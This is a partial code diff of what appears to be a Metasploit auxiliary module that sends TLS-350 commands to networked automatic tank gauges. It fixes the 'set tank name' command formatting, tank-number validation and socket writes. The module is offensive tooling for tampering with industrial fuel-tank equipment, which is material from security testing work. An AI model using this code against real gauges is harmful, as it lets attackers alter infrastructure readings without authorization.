@@ -57,8 +57,8 @@ class Metasploit3 < Msf::Auxiliary
           ],
           [ 'SET_TANK_NAME',
             {
-              'Description' => 'S6020 set tank name',
-              'TLS-350_CMD' => "\x01S6020"
+              'Description' => 'S602 set tank name',
+              'TLS-350_CMD' => "\x01S602"
             }
           ],
           [ 'STATUS',
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # ensure that the tank number is set for the commands that need it
     if action.name == 'SET_TANK_NAME'
-      fail "TANK_NUMBER #{tank_number} is invalid" if tank_number < 0
+      fail "TANK_NUMBER #{tank_number} is invalid" if tank_number < 0 || tank_number > 99
     end
   end
 
@@ -128,15 +128,15 @@ class Metasploit3 < Msf::Auxiliary
       case action.name
       when 'SET_TANK_NAME'
         vprint_status("#{peer} -- setting tank ##{tank_number} to #{tank_name}")
-        request = action.opts[protocol + '_CMD'] + "#{tank_number}#{tank_name}"
-        sock.puts(request)
+        request = action.opts[protocol + '_CMD'] + "#{'%02d' % tank_number}#{tank_name}\n"
+        sock.put(request)
         disconnect
         connect
-        sock.puts(actions.select { |a| a.name == 'INVENTORY' }.first.opts[protocol + '_CMD'])
+        sock.put(actions.select { |a| a.name == 'INVENTORY' }.first.opts[protocol + '_CMD'] + "\n")
         print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
       else
-        request = action.opts[datastore['PROTOCOL'] + '_CMD']
-        sock.puts(request)
+        request = action.opts[datastore['PROTOCOL'] + '_CMD'] + "\n"
+        sock.put(request)
         print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
       end
     ensure
